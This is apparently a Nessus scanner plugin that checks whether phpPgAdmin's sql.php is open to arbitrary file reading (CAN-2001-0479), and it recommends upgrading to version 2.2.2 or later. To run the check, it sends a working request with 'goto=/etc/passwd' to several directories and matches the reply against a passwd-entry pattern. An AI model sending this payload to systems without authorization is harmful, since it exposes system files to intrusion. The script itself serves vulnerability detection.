#
# This script was written by Renaud Deraison <deraison@cvs.nessus.org>
#
# See the Nessus Scripts License for details
#
#
# Ref: http://www.securereality.com.au/archives/sradv00008.txt

if(description)
{
 script_id(11117);
 script_version ("$Revision: 1.10 $");
 script_cve_id("CAN-2001-0479");
 script_bugtraq_id(2640);
 name["english"] = "phpPgAdmin arbitrary files reading";

 script_name(english:name["english"]);
 
 desc["english"] = "
It is possible to make the remote phpPgAdmin installation read
arbitrary data on the remote host.

An attacker may use this flaw to read /etc/passwd or any
file that your web server has the right to access.

Solution : Upgrade to phpPgAdmin 2.2.2 or newer
Risk factor : Serious";




 script_description(english:desc["english"]);
 
 summary["english"] = "Checks for the presence of sql.php";
 
 script_summary(english:summary["english"]);
 
 script_category(ACT_ATTACK);
 
 
 script_copyright(english:"This script is Copyright (C) 2002 Renaud Deraison",
		francais:"Ce script est Copyright (C) 2002 Renaud Deraison");
 family["english"] = "CGI abuses";
 family["francais"] = "Abus de CGI";
 script_family(english:family["english"], francais:family["francais"]);
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}

#
# The script code starts here
#
include("http_func.inc");
include("http_keepalive.inc");

port = get_kb_item("Services/www");
if(!port) port = 80;

if(!get_port_state(port))exit(0);

dir[0] = "/";
dir[1] = "/phpPgAdmin";


f[0] = "sql.php";
f[1] = "sql.php3";


for(i=0;dir[i];i=i+1)
{
 for(j=0;f[j];j=j+1)
 {
  req = http_get(item:string(dir[i], "/", f[j], "?LIB_INC=1&btnDrop=No&goto=/etc/passwd"),
              port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if(r == NULL)exit(0);
 
 if(egrep(pattern:".*root:.*:.*:0:[01]:.*", string:r))
   {
 	security_hole(port);
	exit(0);
   }
  }
}


for(j=0;f[j];j=j+1)
{
 foreach dir (cgi_dirs())
 {
 req = http_get(item:string(dir, "/", f[j], "?LIB_INC=1&btnDrop=No&goto=/etc/passwd"), port:port);
 r = http_keepalive_send_recv(port:port, data:req);
 if( r == NULL ) exit(0);
 if(egrep(pattern:".*root:.*:.*:0:[01]:.*", string:r))
  {
 	security_hole(port);
	exit(0);
  }
 }
}
